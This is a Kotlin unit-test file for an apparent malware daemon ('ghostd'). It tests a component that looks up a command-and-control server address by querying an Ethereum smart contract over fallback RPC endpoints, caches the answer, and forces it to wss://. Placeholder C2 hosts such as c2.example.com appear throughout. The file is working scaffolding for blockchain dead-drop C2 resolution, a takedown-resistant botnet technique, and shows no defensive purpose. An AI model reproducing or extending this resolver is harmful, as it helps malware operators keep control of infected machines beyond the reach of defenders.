package com.tg.ghostd

import com.sun.net.httpserver.HttpServer
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Test
import java.net.InetSocketAddress

class EndpointResolverTest {

    // keccak selector is exercised via C2.ENDPOINT_SELECTOR in the mock below.

    // ------------------------------------------------------------------ ABI

    private fun abiString(s: String): String {
        val bytes = s.toByteArray(Charsets.UTF_8)
        val body = StringBuilder()
        body.append("%064x".format(32))                 // offset
        body.append("%064x".format(bytes.size))          // length
        for (b in bytes) body.append("%02x".format(b))
        while (body.length % 64 != 0) body.append("00")  // pad to word
        return "0x" + body
    }

    @Test fun decodesPlainString() {
        assertEquals(
            "ws://10.1.2.3:8443",
            AbiCodec.decodeString(abiString("ws://10.1.2.3:8443"))
        )
    }

    @Test fun decodesHostPortWithoutScheme() {
        assertEquals("c2.example.com:9000", AbiCodec.decodeString(abiString("c2.example.com:9000")))
    }

    @Test fun rejectsGarbage() {
        assertNull(AbiCodec.decodeString(null))
        assertNull(AbiCodec.decodeString("0x"))
        assertNull(AbiCodec.decodeString("0xdeadbeef"))
        // wrong offset word
        assertNull(AbiCodec.decodeString("0x" + "%064x".format(64) + "%064x".format(1) + "41"))
    }

    // -------------------------------------------------------------- resolver

    @Test fun resolvesViaRpcWithFallbackAndCaches() {
        val server = HttpServer.create(InetSocketAddress(0), 0)
        var hit = 0
        server.createContext("/") { exchange ->
            hit++
            val body = exchange.requestBody.readBytes().decodeToString()
            assert(body.contains("\"eth_call\""))
            assert(body.contains(C2.ENDPOINT_SELECTOR))
            val resp = """{"jsonrpc":"2.0","id":1,"result":"${abiString("c2.example.com:8443")}"}"""
            exchange.responseHeaders.add("Content-Type", "application/json")
            exchange.sendResponseHeaders(200, resp.length.toLong())
            exchange.responseBody.write(resp.toByteArray())
            exchange.close()
        }
        server.start()
        try {
            val port = server.address.port
            var cached: String? = null
            val resolver = EndpointResolver(
                rpcUrls = listOf(
                    "http://127.0.0.1:1/",       // dead — exercises fallback
                    "http://127.0.0.1:$port/"
                ),
                contractAddress = "0xabc",
                selector = C2.ENDPOINT_SELECTOR,
                readCache = { cached },
                writeCache = { cached = it }
            )
            assertEquals("wss://c2.example.com:8443", resolver.resolve())
            assertEquals(1, hit)
            assertEquals("wss://c2.example.com:8443", cached)
        } finally {
            server.stop(0)
        }
    }

    @Test fun fallsBackToCacheWhenAllRpcsFail() {
        var cached: String? = "ws://cached.example:1234"
        val resolver = EndpointResolver(
            rpcUrls = listOf("http://127.0.0.1:1/"),
            contractAddress = "0xabc",
            selector = "5e280f11",
            readCache = { cached },
            writeCache = { cached = it }
        )
        assertEquals("wss://cached.example:1234", resolver.resolve())
        assertEquals("wss://cached.example:1234", cached)
    }

    @Test fun upgradesEveryEndpointFormToWss() {
        assertEquals("wss://c2.example:8443", EndpointResolver.normalize("c2.example:8443"))
        assertEquals("wss://c2.example:8443", EndpointResolver.normalize("ws://c2.example:8443"))
        assertEquals("wss://c2.example:8443", EndpointResolver.normalize("http://c2.example:8443"))
        assertEquals("wss://c2.example:8443", EndpointResolver.normalize("https://c2.example:8443"))
        assertEquals("wss://c2.example:8443", EndpointResolver.normalize("wss://c2.example:8443"))
    }

    @Test fun returnsNullWhenAllFailAndNoCache() {
        val resolver = EndpointResolver(
            rpcUrls = listOf("http://127.0.0.1:1/"),
            contractAddress = "0xabc",
            selector = "5e280f11",
            readCache = { null },
            writeCache = { }
        )
        assertNull(resolver.resolve())
    }
}
